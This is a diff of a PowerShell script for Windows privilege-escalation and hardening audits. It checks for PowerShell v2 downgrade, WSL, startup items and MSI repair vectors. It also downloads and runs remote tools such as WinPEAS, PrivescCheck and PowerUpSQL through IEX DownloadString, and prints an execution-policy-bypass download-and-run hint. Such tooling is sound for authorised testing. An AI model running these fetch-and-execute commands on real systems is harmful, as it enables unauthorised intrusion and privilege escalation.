@@ -31,7 +31,6 @@ function Run {
 
 Banner
 
-# Admin check
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if ($isAdmin) {
     Write-Host "[KO] Running as Administrator" -ForegroundColor Red
@@ -39,75 +38,87 @@ if ($isAdmin) {
     Write-Host "[OK] Not running as Administrator" -ForegroundColor Green
 }
 
-# PS2 downgrade
 try {
     $ps2 = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -ErrorAction SilentlyContinue
     $net2 = Get-WindowsOptionalFeature -Online -FeatureName NetFx3 -ErrorAction SilentlyContinue
     if ($ps2.State -eq 'Enabled' -and $net2.State -eq 'Enabled') {
         Write-Host "[KO] PowerShell downgrade possible (PSv2 + .NET 3.5 present)" -ForegroundColor Red
-        Write-Host "       └─ powershell -version 2 -ep bypass -c `"IEX (New-Object Net.WebClient).DownloadString('URL')`"" -ForegroundColor DarkGray
+        Write-Host "       powershell -version 2 -ep bypass -c `"IEX (New-Object Net.WebClient).DownloadString('URL')`"" -ForegroundColor DarkGray
     } else {
         Write-Host "[OK] PowerShell downgrade not possible" -ForegroundColor Green
     }
 } catch {
-    $test = powershell -version 2 -command '$PSVersionTable.PSVersion.Major' 2>$null
-    if ($test -eq '2') {
-        Write-Host "[KO] PowerShell downgrade possible (PSv2 responsive)" -ForegroundColor Red
-        Write-Host "       └─ powershell -version 2 -ep bypass -c `"IEX (New-Object Net.WebClient).DownloadString('URL')`"" -ForegroundColor DarkGray
-    } else {
-        Write-Host "[OK] PowerShell downgrade not possible" -ForegroundColor Green
-    }
+    Write-Host "[OK] PowerShell downgrade check skipped" -ForegroundColor Green
 }
 
-# Constrained Language
 $clm = $ExecutionContext.SessionState.LanguageMode
 if ($clm -ne 'FullLanguage') {
     Write-Host "[OK] Constrained Language Mode active: $clm" -ForegroundColor Green
 } else {
-    Write-Host "[KO] Language Mode: FullLanguage (no CLM)" -ForegroundColor Red
+    Write-Host "[KO] Language Mode: FullLanguage" -ForegroundColor Red
 }
 
-# WSL
-$wsl = wsl --list --verbose 2>&1
-if ($wsl -match "NAME") {
-    Write-Host "[KO] WSL is installed and has distributions" -ForegroundColor Red
-    $wsl | Where-Object { $_ -match "\S" } | ForEach-Object { Write-Host "       └─ $_" -ForegroundColor DarkGray }
-} else {
+try {
+    $wsl = wsl --list --verbose 2>&1
+    if ($wsl -match "NAME") {
+        Write-Host "[KO] WSL is installed and has distributions" -ForegroundColor Red
+        foreach ($line in $wsl) {
+            if ($line -match "\S") {
+                Write-Host "       $line" -ForegroundColor DarkGray
+            }
+        }
+    } else {
+        Write-Host "[OK] WSL not installed or no distributions" -ForegroundColor Green
+    }
+} catch {
     Write-Host "[OK] WSL not installed or no distributions" -ForegroundColor Green
 }
 
 Write-Host ""
 
-# Basic Recon
-Run "Privileges"        { whoami /priv }                                          "whoami_priv.txt"
-Run "Whoami All"        { whoami /all }                                           "whoami_all.txt"
-Run "Env Variables"     { Get-ChildItem Env: | Format-Table -AutoSize }           "env_vars.txt"
+Run "Privileges (whoami /all)" { whoami /all } "whoami_all.txt"
 
-# Network
-Run "Hosts File"        { Get-Content "$env:SystemRoot\System32\drivers\etc\hosts" } "hosts.txt"
-Run "DNS Cache"         { ipconfig /displaydns }                                  "dns_cache.txt"
-Run "Firewall Rules"    { netsh advfirewall firewall show rule name=all }         "firewall_rules.txt"
+Run "DNS Cache" { ipconfig /displaydns } "dns_cache.txt"
 
-# Users & Groups
-Run "Local Admins"      { net localgroup administrators }                         "local_admins.txt"
-Run "Logged On Users"   { query user 2>$null }                                    "logged_on_users.txt"
+# Admins and logged on users
+$adminOutput = net localgroup administrators
+$loggedOutput = query user 2>$null
+$combined = @()
+$combined += "=== LOCAL ADMINS ===" 
+$combined += $adminOutput
+$combined += "`n=== LOGGED ON USERS ==="
+$combined += $loggedOutput
+$combined | Out-File "$OUT\users_and_admins.txt" -Encoding utf8
+Write-Host "[OK] Users & Admins -> users_and_admins.txt" -ForegroundColor Green
 
-# System
-Run "Processes"         { Get-Process | Select-Object Name,Id,Path | Format-Table -AutoSize } "processes.txt"
-Run "Services"          { Get-Service | Format-Table -AutoSize }                  "services.txt"
-Run "Scheduled Tasks"   { Get-ScheduledTask | Format-Table -AutoSize }            "scheduled_tasks.txt"
-Run "Startup Items"     { Get-CimInstance Win32_StartupCommand | Format-Table -AutoSize } "startup_items.txt"
+Run "Scheduled Tasks" { Get-ScheduledTask | Format-Table -AutoSize } "scheduled_tasks.txt"
 
-# MSI Enum
-Run "MSI Packages" {
-    Get-WmiObject -Class Win32_Product |
-    Where-Object { $_.Vendor -notin @("Microsoft Corporation","Microsoft","Python Software Foundation") } |
+# Startup items
+$startupOutput = Get-CimInstance Win32_StartupCommand |
+    Where-Object { $_.Command -notmatch "SecurityHealthSystray|Windows Defender|MpCmdRun" } |
+    Format-Table -AutoSize
+
+if ($startupOutput) {
+    $startupOutput | Out-File "$OUT\startup_items.txt" -Encoding utf8
+    Write-Host "[KO] Startup items found -> startup_items.txt" -ForegroundColor Red
+} else {
+    Write-Host "[OK] No interesting startup items found" -ForegroundColor Green
+}
+
+# MSI repairing
+$msiOutput = Get-WmiObject -Class Win32_Product |
+    Where-Object { $_.Vendor -notin @("Microsoft Corporation","Microsoft","Python Software Foundation","Parallels International GmbH") } |
     Select-Object Name, Vendor, Version, PackageCache
-} "msi_list.txt"
+
+if ($msiOutput) {
+    $msiOutput | Out-File "$OUT\msi_list.txt" -Encoding utf8
+    Write-Host "[KO] MSI repair LPE possible -> msi_list.txt" -ForegroundColor Red
+} else {
+    Write-Host "[OK] No MSI repair LPE vectors found" -ForegroundColor Green
+}
 
 Write-Host ""
 
-# fkmde
 try {
     & { IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1') } *>&1 | Out-File "$OUT\fkmde.txt" -Encoding utf8
     Write-Host "[OK] fkmde -> fkmde.txt" -ForegroundColor Green
@@ -115,7 +126,6 @@ try {
     Write-Host "[--] fkmde failed: $_" -ForegroundColor DarkGray
 }
 
-# PrivescCheck
 try {
     IEX ((New-Object Net.WebClient).DownloadString('https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1'))
     Invoke-PrivescCheck -Extended -Audit -Report "$OUT\PrivescCheck_$($env:COMPUTERNAME)" -Format TXT | Out-Null
@@ -124,7 +134,6 @@ try {
     Write-Host "[--] PrivescCheck failed: $_" -ForegroundColor DarkGray
 }
 
-# WinPEAS
 try {
     & { IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1') } *>&1 | Out-File "$OUT\winpeas.txt" -Encoding utf8
     Write-Host "[OK] WinPEAS -> winpeas.txt" -ForegroundColor Green
@@ -132,7 +141,6 @@ try {
     Write-Host "[--] WinPEAS failed: $_" -ForegroundColor DarkGray
 }
 
-# HardeningKitty
 try {
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/scipag/HardeningKitty/master/HardeningKitty.ps1')
     Invoke-HardeningKitty -Mode Audit -Log -Report -ReportFile "$OUT\HardeningKitty.csv" | Out-Null
@@ -141,7 +149,6 @@ try {
     Write-Host "[--] HardeningKitty failed: $_" -ForegroundColor DarkGray
 }
 
-# ScriptSentry
 try {
     & { IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/techspence/ScriptSentry/main/ScriptSentry.ps1') } *>&1 | Out-File "$OUT\scriptsentry.txt" -Encoding utf8
     Write-Host "[OK] ScriptSentry -> scriptsentry.txt" -ForegroundColor Green
@@ -149,7 +156,6 @@ try {
     Write-Host "[--] ScriptSentry failed: $_" -ForegroundColor DarkGray
 }
 
-# AppLocker Inspector
 try {
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/techspence/AppLockerInspector/main/Invoke-AppLockerInspector.ps1')
     Invoke-AppLockerInspector -Verbose | Format-Table -Auto | Out-File "$OUT\applocker_inspector.txt" -Encoding utf8
@@ -158,7 +164,6 @@ try {
     Write-Host "[--] AppLocker Inspector failed: $_" -ForegroundColor DarkGray
 }
 
-# PowerUpSQL
 try {
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
     Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {$_.Status -eq "Accessible"} | Get-SQLServerPrivEscRowThreated | Out-File "$OUT\mssql_priv.txt" -Encoding utf8
